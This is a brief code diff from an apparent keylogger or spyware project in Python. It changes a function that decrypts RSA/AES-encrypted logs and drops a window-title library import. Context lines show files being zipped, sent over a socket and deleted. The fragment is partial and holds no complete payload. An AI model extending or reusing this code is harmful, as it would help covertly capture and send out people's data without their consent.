@@ -3,7 +3,6 @@ from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 from sys import argv
-import pygetwindow as gw
 import utils.socket as s
 import datetime, random, zipfile, glob, os
 
@@ -88,14 +87,14 @@ def zipFiles():
     s.send(n + '.zip')
     os.remove(n + '.zip')
 
-def readLog():
-    with open(argv[1],'rb') as f:
+def readLog(file):
+    with open(file,'rb') as f:
         iv = f.read(16)
         key = f.read(256)
         ciphertext = f.read()
     f.close()
     decryptedKey = decryptRSA(key)
-    print(decryptAES(ciphertext,decryptedKey,iv))
+    return (decryptAES(ciphertext,decryptedKey,iv))
 
 def encryptAES(data):
     padded = pad(data,16)
